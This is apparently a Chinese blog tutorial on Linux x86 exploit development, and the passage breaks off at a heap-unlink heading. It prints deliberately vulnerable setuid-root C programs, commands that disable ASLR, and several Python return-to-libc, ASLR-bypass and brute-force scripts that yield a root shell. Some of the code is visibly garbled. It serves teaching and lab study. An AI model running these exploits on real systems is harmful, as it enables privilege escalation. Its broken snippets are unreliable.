<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//test.c  </span><br><span class="line"> #include &lt;stdio.h&gt;  </span><br><span class="line"> #include &lt;string.h&gt;  </span><br><span class="line"> int main(int argc, char* argv[]) </span><br><span class="line"> &#123;  </span><br><span class="line">    char buf[256];  </span><br><span class="line">    seteuid(getuid()); /* Temporarily drop privileges */  </span><br><span class="line">    strcpy(buf,argv[1]);  </span><br><span class="line">    printf(&quot;%s&quot;,buf);  </span><br><span class="line">    fflush(stdout);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>



<p>前一篇文章所述，链接<code>setuid</code>，<code>system</code>和<code>exit</code>将允许我们能够利用漏洞代码<code>vuln</code>。但由于以下两个问题，不是一个直接的任务：在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。其次<code>seteuid_arg</code>应为零。但是由于我们的缓冲区溢出是由于<code>strcpy</code>引起的，所以零变成一个坏的字符，<code>ie</code>这个零之后的字符不会被<code>strcpy()</code>复制到堆栈中。</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu14.png" title="图14">



<p>为了在堆栈中放置<code>多个libc</code>函数或其参数，需要使用<code>帧伪造</code>技术。在这种技术中，而不是使用libc函数地址（本例中为seteuid）直接覆盖返回地址，我们用<code>leave ret</code>指令来覆盖它。这允许攻击者将堆栈中的函数参数存储起来，而不会有任何重叠，从而允许调用<code>相应的libc函数</code>，而不会有任何问题。当攻击者伪造帧进行缓冲区溢出时，如下图堆栈布局所示，成功<code>链接libc函数``seteuid</code>, <code>system</code>和 <code>exit</code>:</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu15.png" title="图15">

<p>上图中的红色突出显示是返回地址，其中每个<code>leave ret</code>指令调用其上方的<code>libc函数</code>。例如，第一个<code>leave ret</code>指令（位于<code>堆栈地址0xbffff1fc</code>）调用<code>seteuid()</code>，而第二个<code>leave ret</code>(位于<code>堆栈地址0xbffff20c</code>)调用<code>system()</code>,第三个<code>leave ret</code>指令（位于<code>堆栈地址0xbffff21c</code>）调用<code>exit()</code>。</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu16.png" title="图16">



<p><strong>利用代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> fake_ebp0 = <span class="number">0xbffff1a0</span>  </span><br><span class="line"> fake_ebp1 = <span class="number">0xbffff1b8</span>  </span><br><span class="line"> fake_ebp2 = <span class="number">0xbffff1d0</span>  </span><br><span class="line"> fake_ebp3 = <span class="number">0xbffff1e8</span>  </span><br><span class="line"> fake_ebp4 = <span class="number">0xbffff204</span>  </span><br><span class="line">fake_ebp5 = <span class="number">0xbffff214</span>  </span><br><span class="line">fake_ebp6 = <span class="number">0xbffff224</span>  </span><br><span class="line">fake_ebp7 = <span class="number">0xbffff234</span>  </span><br><span class="line">leave_ret = <span class="number">0x0804851c</span>  </span><br><span class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span>  </span><br><span class="line">seteuid_addr = <span class="number">0xb7f09720</span>  </span><br><span class="line">system_addr = <span class="number">0xb7e61060</span>  </span><br><span class="line">exit_addr = <span class="number">0xb7e54be0</span>  </span><br><span class="line">sprintf_arg1 = <span class="number">0xbffff210</span>  </span><br><span class="line">sprintf_arg2 = <span class="number">0x80485f0</span>  </span><br><span class="line">sprintf_arg3 = <span class="number">0xbffff23c</span>  </span><br><span class="line">system_arg = <span class="number">0x804829d</span>  </span><br><span class="line">exit_arg = <span class="number">0xffffffff</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">      <span class="keyword">return</span> struc*.pack(<span class="string">"pack("</span>&lt;I<span class="string">",num)   </span></span><br><span class="line"><span class="string">buf = "</span>A<span class="string">"* 264   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp0)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">#Below four stack frames are for sprintf (to setup seteuid arg )  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">sprintf_arg1 += 1  </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp3)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">sprintf_arg1 += 1  </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)   </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp4)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">sprintf_arg1 += 1  </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg1)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg2)   </span></span><br><span class="line"><span class="string">buf += conv(sprintf_arg3)  </span></span><br><span class="line"><span class="string">#Dummy - To avoid null byte in fake_ebp4.   </span></span><br><span class="line"><span class="string">buf += "</span>X<span class="string">" * 4   </span></span><br><span class="line"><span class="string">#Below stack frame is for seteuid  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp5)   </span></span><br><span class="line"><span class="string">buf += conv(seteuid_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">#Dummy - This arg is zero'd by above four sprintf calls  </span></span><br><span class="line"><span class="string">buf += "</span>Y<span class="string">" * 4   </span></span><br><span class="line"><span class="string">#Below stack frame is for system  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp6)   </span></span><br><span class="line"><span class="string">buf += conv(system_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">buf += conv(system_arg)   </span></span><br><span class="line"><span class="string">#Below stack frame is for exit  </span></span><br><span class="line"><span class="string">buf += conv(fake_ebp7)   </span></span><br><span class="line"><span class="string">buf += conv(exit_addr)   </span></span><br><span class="line"><span class="string">buf += conv(leave_ret)   </span></span><br><span class="line"><span class="string">buf += conv(exit_arg)   </span></span><br><span class="line"><span class="string">print "</span>Calling vulnerable program<span class="string">"  </span></span><br><span class="line"><span class="string">call(["</span>./test<span class="string">", buf])</span></span><br></pre></td></tr></table></figure>

<p>执行上述漏洞代码给我们<code>root shell</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu17.png" title="图17">

<hr>
<h2 id="绕过ASLR-第一部分"><a href="#绕过ASLR-第一部分" class="headerlink" title="绕过ASLR - 第一部分"></a>绕过ASLR - 第一部分</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<blockquote>
<p>在前面的攻击教程中，我们看到了攻击者需要知道下面两样事情</p>
<p>1.堆栈地址（跳转到shellcode）</p>
<p>2.libc基地址（成功绕过NX bit）</p>
<p>为了利用漏洞代码。 为了阻止攻击者的行为，安全研究人员提出了一个称为“ASLR”的漏洞利用。</p>
</blockquote>
<p>地址空间布局随机化<code>ASLR</code>是随机化的利用缓解技术:堆栈地址，堆地址，共享库地址这三个一旦桑树地址被随机化，特别是当<code>共享库被随机化</code>时，我们采取的绕过<code>NX Bit</code>的方法不会生效，因为攻击者需要知道<code>libc的基地址</code>。但这种环节技术并不是万无一失的。</p>
<p>因为随机化被关闭，所以<code>libc基址是常量</code>（0xb7e22000 - 对于我们的“vuln”二进制文件）。<code>函数偏移也是不变</code>的（从<code>readelf -s libc.so.6 | grep</code>获得）现在当我们打开完全随机化（使用下面的命令）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure>

<p><code>libc</code>基地址将被随机化。但是<code>libc函数的偏移量</code>是不会变的。所以，如果我们可以<code>绕过共享库及地址随机化</code>，即使打开ASLR，也可以成功利用易受攻击的程序。</p>
<p>在这种技术中，而不是返回到<code>libc函数</code>。而是攻击者返回到一个<code>函数的PLT</code>。由于“function@PLT”不是随机的，所以攻击者不再需要预测libc的及地址，二十可以建档的返回到<code>function@PLT</code>来调用<code>function</code>。</p>
<p>与静态库不同，共享库代码段在多个进程之间共享，其数据段对于每一个进程是唯一的。这有助于减少内存空间和磁盘空间。由于代码段在多个进程之间共享，所以应该只有<code>read</code>和<code>execute</code>权限，英雌动态连接器不能重新定位代码段中存在的数据符号或函数地址。那么动态链接如何在运行时重新定位共享符号。</p>
<p>位置无关代码<code>PIC</code>是为了解决这个问题而开发的 - 它确保共享库代码段在多个进程之间共享，尽管在加载时执行重定位。<code>PIC</code>通过一级间接寻址实现这一点-共享库代码段不包含绝对虚拟地址来代替全局符号和函数引用，而是指向数据段中的特定表。该表是全局符号和函数绝对虚拟地址的占位符。动态链接器作为重定位的一部分来填充此表。因此，只有重定位数据段被修改，代码段保持不变。</p>
<p>全局偏移表<code>GOT</code>：全局偏移表包含每个<code>全局变量</code>的<code>4字节条目</code>，其中4字节条目包含全局变量的地址。当代码段中的指令引用全局变量时，而不是全局变量的绝对虚拟地址，<code>指令指向GOT中条目</code>。当加载共享库时，GOT条目由动态链接器重新定位。因此，<code>PIC</code>使用该表来重新定位具有单个间接级别的全局符号。</p>
<p>过程链接表<code>PLT</code>： 过程链接表包含每个全局函数的存根代码。代码段中的调用指令不直接调用函数<code>function</code>，而是调用存根代码<code>function @ PLT</code>。这个存根代码在动态链接器的帮助下解析了函数地址并将其复制到<code>GOT（GOT [n]）</code>。这次解析仅在函数<code>function</code>的第一次调用期间发生，稍后当代码段中的调用指令调用存根代码<code>function @PLT</code>时，而不是调用动态链接器来解析函数地址<code>function</code>存根代码直接从<code>GOT（GOT [n]）</code>获取功能地址并跳转到它。因此，<code>PIC</code>使用这个表来重新定位具有两级间接的功能地址。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span>  </span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);  </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>

<p>反编译<code>test</code>，我们可以找到<code>system@PLT</code>和 <code>exit@PLT</code>的地址。</p>


<p>使用这些地址我们可以写一个绕过<code>ASLR</code>和<code>NX bit</code>的漏洞利用代码。</p>
<p><strong>利用代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">system = <span class="number">0x8048380</span>  </span><br><span class="line">exit = <span class="number">0x80483a0</span>  </span><br><span class="line">system_arg = <span class="number">0x80485b5</span>     <span class="comment">#Obtained from hexdump output of executable 'test'  </span></span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line"><span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment"># Junk + system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">272</span>  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(exit)  </span><br><span class="line">buf += conv(system_arg)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure>



<p>执行上面的<code>exploit</code>程序给我们<code>root shell</code>，如下所示：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu19.png" title="图19">

<hr>
<h2 id="绕过ASLR-第二部分"><a href="#绕过ASLR-第二部分" class="headerlink" title="绕过ASLR - 第二部分"></a>绕过ASLR - 第二部分</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>使用爆破技巧，来绕过共享库地址随机化。在这个教程中，攻击者选择特定的 <code>Libc 基址</code>，并持续攻击程序直到成功。假设你足够幸运，这个技巧是用于<code>绕过 ASLR</code>的最简单的技巧。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"> </span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);  </span><br><span class="line">    fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>

<p>下面是（当随机化打开时）不同的 <code>Libc 基址</code>：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu20.png" title="图20">

<p>上面展示了，<code>Libc 随机化</code>仅限于 <code>8 位</code>。因此我们可以在最多 <code>256 次尝试内</code>，得到 <code>root shell</code>。在下面的利用代码中，让我们选择<code>0xb75b5000</code>作为<code>Libc</code>基址，并让我们尝试几次。</p>
<p>首先我们先找到<code>system()</code>的偏移量:<code>0x0003f0b0</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu21.png" title="图21">



<p>其次找到<code>exit()</code>的偏移量：<code>0x0032bf0</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu22.png" title="图22">



<p>然后找到<code>/bin/sh</code>的地址：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu23.png" title="图23">



<p><strong>利用代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct </span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">libc_base_addr = <span class="number">0xb75b5000</span>  </span><br><span class="line">exit_off = <span class="number">0x0003f0b0</span>             <span class="comment">#Obtained from "readelf -s libc.so.6 | grep system" command.  </span></span><br><span class="line">system_off = <span class="number">0x00032bf0</span>           <span class="comment">#Obtained from "readelf -s libc.so.6 | grep exit" command.  </span></span><br><span class="line">system_addr = libc_base_addr + system_off  </span><br><span class="line">exit_addr = libc_base_addr + exit_off  </span><br><span class="line">system_arg = <span class="number">0xb76c06a0</span>    </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment">#system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span>  </span><br><span class="line">buf += conv(system_addr)  </span><br><span class="line">buf += conv(exit_addr)  </span><br><span class="line">buf += conv(system_arg)   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line"><span class="comment">#Multiple tries until we get lucky  </span></span><br><span class="line">i = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">256</span>):  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of tries: %d"</span> %i  </span><br><span class="line">i += <span class="number">1</span>  </span><br><span class="line">ret = call([<span class="string">"./test"</span>, buf])  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">not</span> ret):  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line">      <span class="keyword">print</span> <span class="string">"Exploit failed"</span></span><br></pre></td></tr></table></figure>

<p>运行上面的利用代码，我们会得到 <code>root shell</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu24.png" title="图24">

<hr>
<h2 id="绕过ASLR-第三部分"><a href="#绕过ASLR-第三部分" class="headerlink" title="绕过ASLR - 第三部分"></a>绕过ASLR - 第三部分</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>让我们看看如何使用 GOT 覆盖和解引用技巧。来绕过共享库地址随机化。我们在第一部分中提到过，即使可执行文件没有所需的 PLT 桩代码，攻击者也可以使用 GOT 覆盖和解引用技巧来绕过 ASLR。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line">    <span class="keyword">int</span> i;  </span><br><span class="line">    seteuid(getuid());  </span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Need an argument\n"</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">     &#125;  </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\nLen:%d\n"</span>, buf, (<span class="keyword">int</span>)<span class="built_in">strlen</span>(buf));  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>

<p>我们发现<code>system@PLT</code>并没有在我们的可执行文件<code>test</code>中出现。字符串<code>sh</code>也没有在我们的可执行文件<code>test</code>中出现。</p>
<p>将特定 <code>Libc 函数</code>的<code>GOT 条目</code>覆盖为另一个<code>Libc 函数</code>的地址（在第一次调用之后）。但是它也可以覆盖为<code>execve函数</code>的地址 – 当偏移差加到<code>GOT[getuid]</code>的时候。我们已经知道了，在共享库中，函数距离其基址的偏移永远是固定的。所以，如果我们将<code>两个 Libc 函数的差值</code>（<code>execve</code>和<code>getuid</code>）加到<code>getuid</code>的 GOT 条目，我们就得到了<code>execve函数</code>的地址。之后，<code>调用getuid</code>就会<code>调用execve</code>。</p>
<p><code>ROP</code> 是个技巧，其中攻击者一旦得到了调用栈的控制之后，他就可以执行精心构造的机器指令，来执行它所需的操作，即使没有直接的方式。例如，在 <code>return-to-libc</code> 攻击中，我们将返回地址覆盖为<code>system</code>的地址，来执行system。但是如果<code>system</code>（以及<code>execve函数族</code>）从 <code>Libc 共享库</code>中溢出了，攻击者就不能获得 <code>root shell</code>。这时，<code>ROP</code> 就可以拯救攻击者。在这个技巧中，即使任何所需的 Libc 函数都不存在，攻击者可以通过执行一系列的<code>零件</code>（<code>gadget</code>），来模拟所需的 <code>Libc 函数</code>。</p>
<p><strong>Step 1</strong>：我们需要一个零件，它将偏移差加到<code>GOT[getuid]</code>上。所以让我们寻找一个<code>add零件</code>，它将结果复制到内存区域中。</p>
<p><strong>Step 2</strong>：确保 <code>EBX</code> 包含<code>getuid的 GOT 条目</code>。<code>getuid的 GOT 条目</code>（在下面展示）位于<code>0x804a004</code>。因此 <code>EBX</code>应该为<code>0x804a004</code>，但是由于<code>add零件</code>中，固定值<code>0x5d5b04c4</code>加到了 <code>EBX</code>，所以 <code>EBX</code> 应减去这个固定值，也就是<code>ebx = 0x804a004 -0x5d5b04c4 = 0xaaa99b40</code>。</p>
<p><strong>Step 3</strong>：现在我们需要寻找一个零件，它将这个<code>值0xaaa99b40</code>复制到 <code>EBX 寄存器</code>中。确保 <code>EAX</code> 包含偏移差。因此我们需要找到一个零件，它将偏移差复制到 <code>EAX 寄存器</code>中。</p>
<hr>
<h2 id="使用unlink堆溢出"><a href="#使用unlink堆溢出" class="headerlink" title="使用unlink堆溢出"></a>使用unlink堆溢出</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>使用 <code>unlink 技巧</code>成功利用<code>堆溢出</code>。</p>
<p><strong>漏洞程序：</strong></p>
